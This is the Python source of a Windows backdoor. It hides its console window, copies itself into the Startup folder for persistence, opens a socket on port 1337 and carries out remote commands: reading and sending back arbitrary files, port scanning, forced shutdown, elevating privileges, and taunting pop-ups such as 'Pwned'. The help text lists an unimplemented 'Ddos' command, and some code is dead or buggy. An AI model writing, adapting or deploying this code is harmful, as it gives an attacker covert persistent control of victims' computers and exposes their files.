import socket
import subprocess
import os
import shutil
import ctypes
import getpass
import pyautogui
import sys
import datetime
from elevate import elevate
from datetime import datetime
from plyer import notification
import platform 
import time
import screen_brightness_control as sbc
from threading import Thread
import re



ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )


checkos = platform.system()
checkrelease = platform.release()

if checkos == "Windows":
    pass

else:
    sys.exit()

if checkrelease == "10":
    pass

else:
    sys.exit

user = getpass.getuser()


script = __file__

shutil.move(script, "C:\\Users\\" + user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Panda.py")

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
port = 1337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip_address, port))
s.send(bytes("Backdoor running.", "utf-8"))



while True:
    data = s.recv(5000)
    encodeddata = data.decode("utf-8")



    try:

        if encodeddata == "ipconfig":
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            s.send(bytes(ip_address, "utf-8"))
            continue
            


        if encodeddata == "shutdown":
            os.system('cmd /k "shutdown /s"')
            s.send(bytes("Successfull", "utf-8"))
            continue


        if encodeddata == "PopUp":
            pyautogui.alert(text='Got you!', title='Nope not here', button='OK')
            s.send(bytes("PopUp worked", "utf-8"))
            continue


        if encodeddata == "Pscan":
            hostadrr = socket.gethostname()
            ip_for_scan = socket.gethostbyname(hostadrr)
            target = ip_for_scan
            targetIP = socket.gethostbyname(target)

            tstart = datetime.now()

            try:
                for p in range(1, 30):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    res = sock.connect_ex((targetIP, p))
                    if res == 0:
                        s.send(bytes("Open Port " + str(p), "utf-8"))
                    sock.close()
            except Exception:
                print("There was an error.")
                s.send(bytes("There was an error", "utf-8"))
            tend = datetime.now()
            diff = tend - tstart

            time.sleep(2)
            s.send(bytes("Scan completed in " + str(diff), "utf-8"))
            continue




        if encodeddata == "readFile":
            s.send(bytes("What File? (path of the file)", "utf-8"))
            decodedfilename = s.recv(256)
            encodedfilename = decodedfilename.decode("utf-8")
            with open(encodedfilename, "r") as file:
                wordoffile = file.read()
                time.sleep(2)
                s.send(bytes(wordoffile, "utf-8"))  
                continue








        if encodeddata == "Noti":
            notification.notify(title="Pwned", message="It doesnt help to restart the Computer", timeout=10)
            time.sleep(2)
            s.send(bytes("Worked", "utf-8"))
            continue



        if encodeddata == "Version":

            os_info = platform.system()
            os_info_2 = platform.release()
            os_info_3 = os.name
            s.send(bytes(os_info + "\n" + os_info_2 + "\n" + os_info_3, "utf-8"))
            continue





        if encodeddata == "GetUser":
            
            username = getpass.getuser()
            time.sleep(2)
            s.send(bytes("Username: " + username, "utf-8"))
            continue

        if encodeddata == "help":
            time.sleep(2)
            s.send(bytes("Commands: help, ipconfig, GetUser, Version, Noti, readFile, Pscan, PopUp, shutdown, changeBrightness, CloseConnection, Ddos", "utf-8"))
            continue

        if encodeddata == "changeBrightness":
            sbc.set_brightness(50)
            time.sleep(2)
            sbc.set_brightness(0)
            time.sleep(2)
            sbc.set_brightness(100)
            time.sleep(2)
            sbc.set_brightness(50)
            time.sleep(2)
            sbc.set_brightness(0)
            time.sleep(2)
            sbc.set_brightness(100)
            s.send(bytes("Worked", "utf-8"))
            continue


        


        if encodeddata == "CloseConnection":
            s.close()
            sys.exit()
            continue

            host = encodedadress
            ip = host
            port = encodedPortforddos

        else:
            s.send(bytes("Nope not a valid Command", "utf-8"))

    except PermissionError:
        elevate() 


    except ImportError:
        os.system('cmd /k "pip install elevate')
        os.system('cmd /k "pip install schedule')
        os.system('cmd /k "pip install plyer')        
        os.system('cmd /k "pip install screen_brightness_control')
        os.system('cmd /k "pip install pyautogui')

    except ConnectionError:
        s.send(bytes("connection failed", "utf-8"))
        os.open(__file__)
        sys.exit()

    
